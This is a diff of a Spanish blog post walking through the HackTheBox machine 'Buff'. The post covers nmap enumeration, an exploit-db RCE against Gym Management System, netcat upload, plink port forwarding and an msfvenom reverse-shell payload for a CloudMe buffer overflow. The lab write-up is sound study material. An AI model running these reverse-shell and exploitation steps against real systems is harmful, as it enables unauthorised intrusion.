@@ -1,8 +1,10 @@
 ---
 layout      : post
 title       : "HackTheBox - Buff"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png
 category    : [ htb ]
+tags        : [ file-upload, buffer-overflow ]
 ---
 Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema... ¿Sencillo, no? pues...
 
@@ -16,23 +18,23 @@ Buenas buenas, e.e. Mediante la enumeración de servicios nos encontramos con el
 
 Tendremos 3 fases. Enumeración, explotación y escalada de privilegios (:
 
-1. [Enumeración](#enumeración)
-2. [Explotación](#explotación)
+1. [Enumeración](#enumeracion)
+2. [Explotación](#explotacion)
 3. [Escalada de privilegios](#escalada-de-privilegios)
 
 ...
 
-## Enumeración [#](#enumeración) {#enumeración}
+## Enumeración [#](#enumeracion) {#enumeracion}
 
 Hacemos un escaneo de puertos con `nmap`, primero validamos que tal va de velocidad y según eso agregamos parámetros para hacerlo más rápido, eso si, validando falsos positivos (que se nos pierdan puertos).
 
-```sh
+```bash
 $nmap -p- --open -Pn -v 10.10.10.198
 ```
 
 Wow, va muy lento, agregándole `-T` no cambia mucho, así que usaremos `--min-rate`.
 
-```sh
+```bash
 $nmap -p- --open --min-rate=2000 -Pn -v 10.10.10.198
 ```
 
@@ -55,7 +57,7 @@ Perfe, obtenemos dos puertos.
 
 Ahora que tenemos los puertos, haremos un escaneo para verificar que versión y scripts maneja cada uno.
 
-```sh
+```bash
 $nmap -p8080,7680 -sC -sV 10.10.10.193 -oN portScan
 ```
 
@@ -78,11 +80,13 @@ Enumerando la página vemos que software se usó para su creación.
 
 ![pagecontact](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pagecontact.png)
 
-## Explotación [#](#explotación) {#explotación}
+...
+
+## Explotación [#](#explotacion) {#explotacion}
 
 Buscando exploits sobre el, encontramos:
 
-```sh
+```bash
 $searchsploit gym
 -------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                      |  Path
@@ -91,13 +95,13 @@ Gym Management System 1.0 - Unauthenticated Remote Code Execution               
 -------------------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
 
-* Este es el exploit: [Exploit Gym Management System](https://www.exploit-db.com/exploits/48506)
+* Este es el exploit: [Exploit Gym Management System](https://www.exploit-db.com/exploits/48506).
 
 Perfecto, validando el código y el PoC, hace un bypass en la subida de archivos de la página `/upload.php` para almacenar un archivo que nos permita ejecutar comandos desde el mismo exploit. Está perfectamente explicado en el script :P
 
 El mismo exploit nos "emula" una Shell, pero no estamos en una Shell (parece, pero es por que en el script se está ejecutando `echo %CD%`, lo cual en Windows nos dice en que carpeta estamos), simplemente tenemos ejecución de comandos, pero limitados, por lo que lo mejor es subir el binario `netcat` para posteriormente ponernos en escucha y simplemente enviar la petición con el exploit.
 
-```sh
+```bash
 $python3 -m http.server
 ```
 
@@ -105,7 +109,7 @@ $python3 -m http.server
 
 Listo, estando dentro y haciendo una enumeración básica sobre el usuario **shaun**, nos encontramos con un binario en su carpeta de descargas.
 
-```
+```powershell
 c:\Users\shaun\Downloads>dir
 dir
  Volume in drive C has no label.
@@ -122,13 +126,15 @@ dir
 c:\Users\shaun\Downloads>
 ```
 
+...
+
 ## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}
 
 Investigando en internet vemos que esa versión de **CloudMe** es vulnerable a `Buffer Overflow` (si lo relacionamos con el nombre de la máquina sabemos que este es el camino) permitiéndonos ejecutar comandos en el sistema. Ya existen varios PoC (pruebas de concepto) que lo explotan.
 
 En todos los exploits usan el puerto 8888, con ello entendemos que CloudMe se ejecuta en ese puerto. En nuestro escaneo no lo obtuvimos, veamos su estado. Si ejecutamos el binario y posteriormente validamos si el puerto está arriba vamos a verlo arriba:
 
-```
+```powershell
 c:\Users\shaun\Downloads>netstat -a | findstr 8888
 ```
 
@@ -153,7 +159,7 @@ El Remote Port Forwarding lo haremos con `plink.exe` (relativamente parecido a *
 
 Pero antes, veamos alguna configuración necesaria en nuestra máquina atacante sobre SSH. En el archivo `/etc/ssh/sshd_config` debemos modificar que nos permita ingresar como root, por que si no, nos va a botar unos errores.
 
-```sh
+```bash
 $cat /etc/ssh/sshd_config
 ...
 ...
@@ -164,13 +170,13 @@ PermitRootLogin yes
 
 Y ahora reiniciamos el servicio SSH.
 
-```sh
+```bash
 $service ssh restart
 ```
 
 Listo ahora si procedemos a subir el binario y ejecutarlo.
 
-```
+```powershell
 c:\Users\shaun\Downloads>cd c:\xampp\tmp
 cd c:\xampp\tmp
 
@@ -184,7 +190,7 @@ FATAL ERROR: Network error: Connection timed out
 
 Acá tuve algunos problemas, ya que por alguna extraña razón (valide firewall, configuraciones, etc) no me permitía conectarme al puerto **22** (SSH), así que cambiando el puerto que estará en escucha si nos permite ejecutarlo.
 
-```sh
+```bash
 $cat /etc/ssh/sshd_config
 ...
 Port 177
@@ -200,11 +206,11 @@ Perfecto, ya tenemos el puerto 8888 del localhost de la máquina 10.10.10.198 (B
 Usaremos dos exploits, de uno obtendré como generar el payload y el otro será la estructura del script.
 
 * [Payload](https://www.exploit-db.com/exploits/48499), aunque se puede usar este también para explotarlo, pero me pareció más legible el siguiente:
-* [El que usaremos](https://www.exploit-db.com/exploits/48389)
+* [El que usaremos](https://www.exploit-db.com/exploits/48389).
 
 Le diremos que nos genere una reverse Shell hacia el puerto **4433**. Primero generemos el payload con `msfvenom` (que no es lo mismo que `msfconsole` (metasploit)).
 
-```sh
+```bash
 # msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -b "\x00\x0d\x0a" -f python
 $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.86 LPORT=4433 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
 ```
@@ -212,6 +218,8 @@ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.86 LPORT=4433 EXITFUNC=thr
 El output lo ponemos en el exploit. Nos ponemos en escucha y listo, ejecutará todo sobre el **localhost:8888**.
 
 ![pyexploitandflags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/pyexploitandflags.png)
+
+...
 
 Y listones, primer **BOF** en HTB que "hago" (en este caso simplemente lo ejecuté), sencilla, bonita y nueva para mí.
 
